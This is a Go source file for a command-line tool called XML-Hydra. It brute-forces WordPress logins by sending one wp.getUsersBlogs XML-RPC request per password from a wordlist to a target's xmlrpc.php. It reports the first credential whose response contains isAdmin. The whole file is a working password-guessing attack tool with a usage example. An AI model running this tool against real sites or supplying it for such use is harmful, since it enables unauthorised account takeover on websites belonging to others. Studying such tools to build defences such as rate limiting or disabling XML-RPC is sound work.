package main

import (
	"bufio"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"regexp"
	"strings"

	"github.com/schollz/progressbar/v3"
)

const banner = `__________________________________________________________________________________________
___  ___  ___      ___  ___-      __    __  ___  ___  ________    _______        __      
|"  \/"  ||"  \    /"  ||"  |     /" |  | "\|"  \/"  ||"      "\  /"      \      /""\     
 \   \  /  \   \  //   |||  |    (:  (__)  :)\   \  / (.  ___  :)|:        |    /    \    
  \\  \/   /\\  \/.    ||:  |     \/      \/  \\  \/  |: \   ) |||_____/   )   /' /\  \   
  /\.  \  |: \.        | \  |___  //  __  \\  /   /   (| (___\ || //      /   //  __'  \  
 /  \   \ |.  \    /:  |( \_|:  \(:  (  )  :)/   /    |:       :)|:  __   \  /   /  \\  \ 
|___/\___||___|\__/|___| \_______)\__|  |__/|___/     (________/ |__|  \___)(___/    \___)                             

# XML-Hydra
# https://github.com/prasant-paudel/xml-hydra
__________________________________________________________________________________________
`

const printDefaults = `
Usage: xml-hydra [OPTIONS]

OPTIONS:
 -t    Target URL
 -u    Username
 -w    Wordlist for passwords
 -h    Shows help message

EXAMPLE:  xml-hydra -t https://example.com/xmlrpc.php -u username -w passwords.txt

`

var (
	targetUrl string
	username  string
	wordlist  string
	help      bool
	re        = regexp.MustCompile(`(<name>isAdmin<\/name>)`)
)

func argParse() {
	flag.StringVar(&targetUrl, "t", "", "Target URL")
	flag.StringVar(&username, "u", "", "Username")
	flag.StringVar(&wordlist, "w", "", "Wordlist for passwords")
	flag.BoolVar(&help, "h", false, "Shows help message")

	flag.Parse()

	if help || targetUrl == "" || username == "" || wordlist == "" {
		fmt.Printf(banner + printDefaults)
		fmt.Println(targetUrl)
		os.Exit(0)
	}
}

type Request struct {
	URL      string
	Username string
	Password string
	ProxyURL string
}

type Response struct {
	Match   bool
	Request Request
	Error   error
}

func main() {
	argParse()

	ch := make(chan Response, 10)

	passwords := ReadFileLines(wordlist)
	CheckPasswords(targetUrl, username, passwords, ch)

	bar := progressbar.Default(int64(len(passwords)))

	for r := range ch {
		if r.Error != nil {
			fmt.Printf("[!] Error checking (%s:%s)", r.Request.Username, r.Request.Password)
		} else if r.Match {
			fmt.Printf("[+] Matched -> %s:%s\n", r.Request.Username, r.Request.Password)
			break
		}
		bar.Add(1)
	}
}

func CheckPasswords(url, username string, passwords []string, ch chan<- Response) {
	go func() {
		for i := 0; i < len(passwords); i++ {
			r := Request{
				URL:      url,
				Username: username,
				Password: passwords[i],
				ProxyURL: "",
			}
			ch <- r.SendRequest()
		}
		close(ch)
	}()
}

func (r *Request) Body() io.Reader {
	return strings.NewReader(fmt.Sprintf(`
	<?xml version="1.0" encoding="UTF-8"?>
	<methodCall>
	  <methodName>wp.getUsersBlogs</methodName>
	  <params>
	    <param><value>%s</value></param>
	    <param><value>%s</value></param>
	  </params>
	</methodCall>`, r.Username, r.Password))
}

func (r *Request) SendRequest() Response {
	req, _ := http.NewRequest("POST", r.URL, r.Body())
	client := http.Client{}

	res, err := client.Do(req)

	if err != nil {
		return Response{
			Match:   false,
			Request: *r,
			Error:   err,
		}
	}

	defer res.Body.Close()
	body, err := io.ReadAll(res.Body)

	if err != nil {
		return Response{Match: false, Request: *r, Error: err}
	}

	return Response{
		Match:   re.Match(body),
		Request: *r,
	}
}

func ReadFileLines(filePath string) []string {
	var lines []string
	file, err := os.Open(filePath)
	if err != nil {
		log.Fatal(err)
	}
	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)
	for scanner.Scan() {
		lines = append(lines, strings.TrimSpace(scanner.Text()))
	}
	file.Close()
	return lines
}
